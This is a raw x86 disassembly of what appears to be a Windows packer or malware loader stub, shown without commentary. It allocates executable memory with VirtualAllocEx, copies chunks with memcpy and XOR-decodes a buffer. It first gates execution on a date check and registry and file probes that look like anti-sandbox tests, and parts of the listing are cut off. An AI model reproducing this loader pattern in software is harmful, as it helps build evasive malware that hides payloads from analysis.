0x00454860:	pushl	%ebp	; from: 0x00454ca6(MAY), 0x00454dba(MAY)
0x00454861:	movl	%esp, %ebp
0x00454863:	subl	$0xc, %esp
0x00454866:	movl	$0x1e4dc, -8(%ebp)
0x0045486d:	movl	$0x3000, -12(%ebp)
0x00454874:	movl	$0x40, -4(%ebp)
0x0045487b:	movl	-4(%ebp), %eax
0x0045487e:	pushl	%eax
0x0045487f:	movl	-12(%ebp), %ecx
0x00454882:	pushl	%ecx
0x00454883:	movl	0x8(%ebp), %edx
0x00454886:	pushl	%edx
0x00454887:	pushl	$0x0
0x00454889:	pushl	$0xffffffff
0x0045488b:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff0017e0(MAY)
0x00454891:	movl	%ebp, %esp
0x00454893:	popl	%ebp
0x00454894:	ret	; targets: 0x00454cab(MAY), 0x00454dbf(MAY)

0x004548a0:	pushl	%ebp	; from: 0x00454cc4(MAY)
0x004548a1:	movl	%esp, %ebp
0x004548a3:	popl	%ebp
0x004548a4:	ret	; targets: 0x00454cc9(MAY)

0x004548b0:	pushl	%ebp	; from: 0x00454cf8(MAY)
0x004548b1:	movl	%esp, %ebp
0x004548b3:	subl	$0x8, %esp
0x004548b6:	movl	0x8(%ebp), %eax
0x004548b9:	movl	%eax, -4(%ebp)
0x004548bc:	movl	0xc(%ebp), %ecx
0x004548bf:	movl	%ecx, -8(%ebp)
0x004548c2:	movl	-4(%ebp), %edx
0x004548c5:	cmpl	-8(%ebp), %edx
0x004548c8:	jae	0x004548d1	; targets: 0x004548ca(MAY), 0x004548d1(MAY)
0x004548ca:	movl	-4(%ebp), %eax	; from: 0x004548c8(MAY)
0x004548cd:	jmp	0x004548d4	; targets: 0x004548d4(MAY)
0x004548d1:	movl	-8(%ebp), %eax	; from: 0x004548c8(MAY)
0x004548d4:	movl	%ebp, %esp	; from: 0x004548cd(MAY)
0x004548d6:	popl	%ebp
0x004548d7:	ret	; targets: 0x00454cfd(MAY)

0x004548e0:	pushl	%ebp	; from: 0x00454bbf(MAY)
0x004548e1:	movl	%esp, %ebp
0x004548e3:	movl	$0x401004, 0x00458c68
0x004548ed:	popl	%ebp
0x004548ee:	ret	; targets: 0x00454bc4(MAY)

0x004548f0:	pushl	%ebp	; from: 0x00454d9a(MAY)
0x004548f1:	movl	%esp, %ebp
0x004548f3:	movl	$0x4538b8, 0x00458c68
0x004548fd:	popl	%ebp
0x004548fe:	ret	; targets: 0x00454d9f(MAY)

0x00454900:	pushl	%ebp	; from: 0x00454da5(MAY), 0x00454c91(MAY)
0x00454901:	movl	%esp, %ebp
0x00454903:	movl	0x8(%ebp), %eax
0x00454906:	movl	-4(%eax), %eax
0x00454909:	popl	%ebp
0x0045490a:	ret	; targets: 0x00454c96(MAY), 0x00454daa(MAY)

0x00454990:	pushl	%ebp	; from: 0x00454d7e(MAY)
0x00454991:	movl	%esp, %ebp
0x00454993:	subl	$0x24, %esp
0x00454996:	movl	$0xdbc8, -8(%ebp)
0x0045499d:	movl	$0x0, -16(%ebp)
0x004549a4:	jmp	0x004549af	; targets: 0x004549af(MAY)
0x004549af:	movl	-16(%ebp), %ecx	; from: 0x004549a4(MAY)
0x004549b2:	cmpl	0xc(%ebp), %ecx
0x004549b5:	jae	0x00454a7e	; targets: 0x004549bb(MAY), 0x00454a7e(MAY)
0x004549bb:	movl	$0xdbc8, -8(%ebp)	; from: 0x004549b5(MAY)
0x004549c2:	cmpl	$0x0, -16(%ebp)
0x004549c6:	jne	0x00454a18	; targets: 0x004549c8(MAY)
0x004549c8:	pushl	$0x104	; from: 0x004549c6(MAY)
0x004549cd:	pushl	$0x458c6c
0x004549d2:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff0017c0(MAY)
0x004549d8:	pushl	$0x456000
0x004549dd:	pushl	$0x458c6c
0x004549e2:	call	lstrcatA@kernel32.dll	; targets: 0xff0016e0(MAY)
0x004549e8:	pushl	$0x0
0x004549ea:	pushl	$0x80
0x004549ef:	pushl	$0x3
0x004549f1:	pushl	$0x0
0x004549f3:	pushl	$0x3
0x004549f5:	pushl	$0x1
0x004549f7:	pushl	$0x458c6c
0x004549fc:	call	CreateFileA@kernel32.dll	; targets: 0xff0016c0(MAY)
0x00454a02:	movl	%eax, -4(%ebp)
0x00454a05:	cmpl	$0xffffffff, -4(%ebp)
0x00454a09:	je	0x00454a11	; targets: 0x00454a0b(MAY), 0x00454a11(MAY)
0x00454a0b:	cmpl	$0x0, -4(%ebp)	; from: 0x00454a09(MAY)
0x00454a0f:	jne	0x00454a18	; targets: 0x00454a11(MAY), 0x00454a18(MAY)
0x00454a11:	movl	$0x42, %eax	; from: 0x00454a0f(MAY), 0x00454a09(MAY)
0x00454a16:	jmp	0x00454a7e	; targets: 0x00454a7e(MAY)
0x00454a18:	movl	$0xdbc8, -8(%ebp)	; from: 0x00454a0f(MAY)
0x00454a1f:	movl	-16(%ebp), %edx
0x00454a22:	addl	$0xd, %edx
0x00454a25:	movl	%edx, 0x00458d70
0x00454a2b:	movl	0x8(%ebp), %eax
0x00454a2e:	addl	-16(%ebp), %eax
0x00454a31:	movl	(%eax), %ecx
0x00454a33:	addl	-16(%ebp), %ecx
0x00454a36:	movl	0x8(%ebp), %edx
0x00454a39:	addl	-16(%ebp), %edx
0x00454a3c:	movl	%ecx, (%edx)
0x00454a3e:	movl	-12(%ebp), %eax
0x00454a41:	movl	%eax, -20(%ebp)
0x00454a44:	movl	$0xdbc8, -8(%ebp)
0x00454a4b:	movl	0x00458d70, %ecx
0x00454a51:	movl	%ecx, -36(%ebp)
0x00454a54:	movl	-36(%ebp), %edx
0x00454a57:	movl	%edx, -32(%ebp)
0x00454a5a:	movl	-32(%ebp), %eax
0x00454a5d:	movl	%eax, -28(%ebp)
0x00454a60:	movl	-28(%ebp), %ecx
0x00454a63:	movl	%ecx, -24(%ebp)
0x00454a66:	movl	0x8(%ebp), %edx
0x00454a69:	addl	-16(%ebp), %edx
0x00454a6c:	movl	(%edx), %eax
0x00454a6e:	xorl	-24(%ebp), %eax
0x00454a7e:	movl	%ebp, %esp	; from: 0x00454a16(MAY), 0x004549b5(MAY)
0x00454a80:	popl	%ebp
0x00454a81:	ret	; targets: 0x00454d83(MAY)

0x00454af0:	pushl	%ebp	; from: 0x00454b98(MAY), 0x00454c3f(MAY)
0x00454af1:	movl	%esp, %ebp
0x00454af3:	subl	$0x8, %esp
0x00454af6:	movl	$0x456018, -4(%ebp)
0x00454afd:	leal	-8(%ebp), %eax
0x00454b00:	pushl	%eax
0x00454b01:	pushl	$0x20019
0x00454b06:	pushl	$0x0
0x00454b08:	pushl	$0x458c60
0x00454b0d:	pushl	$0x80000002
0x00454b12:	call	0x00458d74	; targets: 0xff0018a0(MAY)
0x00454b18:	testl	%eax, %eax
0x00454b1a:	je	0x00454b23	; targets: 0x00454b1c(MAY), 0x00454b23(MAY)
0x00454b1c:	xorl	%eax, %eax	; from: 0x00454b1a(MAY)
0x00454b1e:	jmp	0x00454bc4	; targets: 0x00454bc4(MAY)
0x00454b23:	leal	-8(%ebp), %ecx	; from: 0x00454b1a(MAY)
0x00454b26:	pushl	%ecx
0x00454b27:	pushl	$0x20019
0x00454b2c:	pushl	$0x0
0x00454b2e:	pushl	$0x458c64
0x00454b33:	pushl	$0x80000002
0x00454b38:	call	0x00458d74	; targets: 0xff0018a0(MAY)
0x00454b3e:	testl	%eax, %eax
0x00454b40:	je	0x00454b46	; targets: 0x00454b46(MAY), 0x00454b42(MAY)
0x00454b42:	xorl	%eax, %eax	; from: 0x00454b40(MAY)
0x00454b44:	jmp	0x00454bc4	; targets: 0x00454bc4(MAY)
0x00454b46:	movl	$0x53, %edx	; from: 0x00454b40(MAY)
0x00454b4b:	movl	-4(%ebp), %eax
0x00454b4e:	movw	%dx, (%eax)
0x00454b51:	leal	-8(%ebp), %ecx
0x00454b54:	pushl	%ecx
0x00454b55:	pushl	$0x20019
0x00454b5a:	pushl	$0x0
0x00454b5c:	movl	-4(%ebp), %edx
0x00454b5f:	pushl	%edx
0x00454b60:	movl	-8(%ebp), %eax
0x00454b63:	pushl	%eax
0x00454b64:	call	0x00458d74	; targets: 0xff0018a0(MAY)
0x00454b6a:	testl	%eax, %eax
0x00454b6c:	je	0x00454b72	; targets: 0x00454b6e(MAY), 0x00454b72(MAY)
0x00454b6e:	xorl	%eax, %eax	; from: 0x00454b6c(MAY)
0x00454b70:	jmp	0x00454bc4	; targets: 0x00454bc4(MAY)
0x00454b72:	leal	-8(%ebp), %ecx	; from: 0x00454b6c(MAY)
0x00454b75:	pushl	%ecx
0x00454b76:	pushl	$0x20019
0x00454b7b:	pushl	$0x0
0x00454b7d:	pushl	$0x456030
0x00454b82:	movl	-8(%ebp), %edx
0x00454b85:	pushl	%edx
0x00454b86:	call	0x00458d74	; targets: 0xff0018a0(MAY)
0x00454b8c:	testl	%eax, %eax
0x00454b8e:	je	0x00454b9d	; targets: 0x00454b90(MAY), 0x00454b9d(MAY)
0x00454b90:	pushl	$0x1	; from: 0x00454b8e(MAY)
0x00454b92:	pushl	$0x1
0x00454b94:	pushl	$0x1
0x00454b96:	pushl	$0x1
0x00454b98:	call	0x00454af0	; targets: 0x00454af0(MAY)
0x00454b9d:	leal	-8(%ebp), %eax	; from: 0x00454b8e(MAY), 0x00454bc7(MAY)
0x00454ba0:	pushl	%eax
0x00454ba1:	pushl	$0x20019
0x00454ba6:	pushl	$0x0
0x00454ba8:	pushl	$0x4560a8
0x00454bad:	movl	-8(%ebp), %ecx
0x00454bb0:	pushl	%ecx
0x00454bb1:	call	0x00458d74	; targets: 0xff0018a0(MAY)
0x00454bb7:	testl	%eax, %eax
0x00454bb9:	jne	0x00454bbf	; targets: 0x00454bbb(MAY), 0x00454bbf(MAY)
0x00454bbb:	xorl	%eax, %eax	; from: 0x00454bb9(MAY)
0x00454bbd:	jmp	0x00454bc4	; targets: 0x00454bc4(MAY)
0x00454bbf:	call	0x004548e0	; targets: 0x004548e0(MAY)	; from: 0x00454bb9(MAY)
0x00454bc4:	movl	%ebp, %esp	; from: 0x00454b1e(MAY), 0x00454b44(MAY), 0x00454b70(MAY), 0x00454bbd(MAY), 0x004548ee(MAY)
0x00454bc6:	popl	%ebp
0x00454bc7:	ret	$0x10	; targets: 0x00454c44(MAY), 0x00454b9d(MAY)


start:
0x00454bd0:	pushl	%ebp
0x00454bd1:	movl	%esp, %ebp
0x00454bd3:	subl	$0x4d4, %esp
0x00454bd9:	pusha	
0x00454bda:	movl	%ebp, 0x00458d78
0x00454be0:	movl	$0x0, -1184(%ebp)
0x00454bea:	movl	$0x80000002, -1204(%ebp)
0x00454bf4:	movl	$0xe1d58000, -8(%ebp)
0x00454bfb:	movl	$0x1a8e79f, -4(%ebp)
0x00454c02:	movl	RegOpenKeyExW@advapi32.dll, %eax
0x00454c07:	movl	%eax, 0x00458d74
0x00454c0c:	leal	-1208(%ebp), %ecx
0x00454c12:	pushl	%ecx
0x00454c13:	leal	-1212(%ebp), %edx
0x00454c19:	pushl	%edx
0x00454c1a:	leal	-8(%ebp), %eax
0x00454c1d:	pushl	%eax
0x00454c1e:	call	FileTimeToDosDateTime@kernel32.dll	; targets: 0xff0016a0(MAY)
0x00454c24:	movzwl	-1212(%ebp), %ecx
0x00454c2b:	cmpl	$0x21, %ecx
0x00454c2e:	je	0x00454c37	; targets: 0x00454c37(MAY), 0x00454c30(MAY)
0x00454c30:	xorl	%eax, %eax	; from: 0x00454c2e(MAY)
0x00454c32:	jmp	0x00454f05	; targets: 0x00454f05(MAY)
0x00454c37:	pushl	$0x1	; from: 0x00454c2e(MAY)
0x00454c39:	pushl	$0x1
0x00454c3b:	pushl	$0x1
0x00454c3d:	pushl	$0x1
0x00454c3f:	call	0x00454af0	; targets: 0x00454af0(MAY)
0x00454c44:	movl	$0x0, -1060(%ebp)	; from: 0x00454bc7(MAY)
0x00454c4e:	movl	$0x64, -1172(%ebp)
0x00454c58:	movl	$0x1e, -1068(%ebp)
0x00454c62:	movl	$0x0, -1184(%ebp)
0x00454c6c:	movl	$0x0, -1124(%ebp)
0x00454c76:	movl	$0x1, -1168(%ebp)
0x00454c80:	movl	$0x3, -1064(%ebp)
0x00454c8a:	movl	0x00458c68, %edx
0x00454c90:	pushl	%edx
0x00454c91:	call	0x00454900	; targets: 0x00454900(MAY)
0x00454c96:	addl	$0x4, %esp	; from: 0x0045490a(MAY)
0x00454c99:	movl	%eax, -1188(%ebp)
0x00454c9f:	movl	-1188(%ebp), %eax
0x00454ca5:	pushl	%eax
0x00454ca6:	call	0x00454860	; targets: 0x00454860(MAY)
0x00454cab:	addl	$0x4, %esp	; from: 0x00454894(MAY)
0x00454cae:	movl	%eax, -1180(%ebp)
0x00454cb4:	movl	-1188(%ebp), %ecx
0x00454cba:	pushl	%ecx
0x00454cbb:	pushl	$0x0
0x00454cbd:	movl	-1180(%ebp), %edx
0x00454cc3:	pushl	%edx
0x00454cc4:	call	0x004548a0	; targets: 0x004548a0(MAY)
0x00454cc9:	addl	$0xc, %esp	; from: 0x004548a4(MAY)
0x00454ccc:	movl	-1188(%ebp), %eax
0x00454cd2:	movl	%eax, -1196(%ebp)
0x00454cd8:	movl	-1184(%ebp), %ecx	; from: 0x00454d6b(MAY)
0x00454cde:	cmpl	-1188(%ebp), %ecx
0x00454ce4:	jae	0x00454d70	; targets: 0x00454cea(MAY), 0x00454d70(MAY)
0x00454cea:	movl	-1196(%ebp), %edx	; from: 0x00454ce4(MAY)
0x00454cf0:	pushl	%edx
0x00454cf1:	movl	-1172(%ebp), %eax
0x00454cf7:	pushl	%eax
0x00454cf8:	call	0x004548b0	; targets: 0x004548b0(MAY)
0x00454cfd:	addl	$0x8, %esp	; from: 0x004548d7(MAY)
0x00454d00:	movl	%eax, -1200(%ebp)
0x00454d06:	movl	-1200(%ebp), %ecx
0x00454d0c:	pushl	%ecx
0x00454d0d:	movl	0x00458c68, %edx
0x00454d13:	addl	-1124(%ebp), %edx
0x00454d19:	pushl	%edx
0x00454d1a:	movl	-1180(%ebp), %eax
0x00454d20:	addl	-1184(%ebp), %eax
0x00454d26:	pushl	%eax
0x00454d27:	call	0x004554ec	; targets: 0x004554ec(MAY)
0x00454d2c:	addl	$0xc, %esp
0x00454d2f:	movl	-1068(%ebp), %ecx
0x00454d35:	addl	-1172(%ebp), %ecx
0x00454d3b:	addl	-1124(%ebp), %ecx
0x00454d41:	movl	%ecx, -1124(%ebp)
0x00454d47:	movl	-1184(%ebp), %edx
0x00454d4d:	addl	-1172(%ebp), %edx
0x00454d53:	movl	%edx, -1184(%ebp)
0x00454d59:	movl	-1196(%ebp), %eax
0x00454d5f:	subl	-1200(%ebp), %eax
0x00454d65:	movl	%eax, -1196(%ebp)
0x00454d6b:	jmp	0x00454cd8	; targets: 0x00454cd8(MAY)
0x00454d70:	movl	-1188(%ebp), %ecx	; from: 0x00454ce4(MAY)
0x00454d76:	pushl	%ecx
0x00454d77:	movl	-1180(%ebp), %edx
0x00454d7d:	pushl	%edx
0x00454d7e:	call	0x00454990	; targets: 0x00454990(MAY)
0x00454d83:	addl	$0x8, %esp	; from: 0x00454a81(MAY)
0x00454d86:	movl	$0x0, -1124(%ebp)
0x00454d90:	movl	$0x0, -1220(%ebp)
0x00454d9a:	call	0x004548f0	; targets: 0x004548f0(MAY)
0x00454d9f:	movl	0x00458c68, %eax	; from: 0x004548fe(MAY)
0x00454da4:	pushl	%eax
0x00454da5:	call	0x00454900	; targets: 0x00454900(MAY)
0x00454daa:	addl	$0x4, %esp	; from: 0x0045490a(MAY)
0x00454dad:	movl	%eax, -1224(%ebp)
0x00454db3:	movl	-1224(%ebp), %ecx
0x00454db9:	pushl	%ecx
0x00454dba:	call	0x00454860	; targets: 0x00454860(MAY)
0x00454dbf:	addl	$0x4, %esp	; from: 0x00454894(MAY)
0x00454f05:	movl	%ebp, %esp	; from: 0x00454c32(MAY)
0x00454f07:	popl	%ebp
0x00454f08:	ret	; targets: 0xfee70000(MAY)

0x004554ec:	jmp	memcpy@msvcrt.dll	; targets: 0xff0018e0(MAY)	; from: 0x00454d27(MAY)
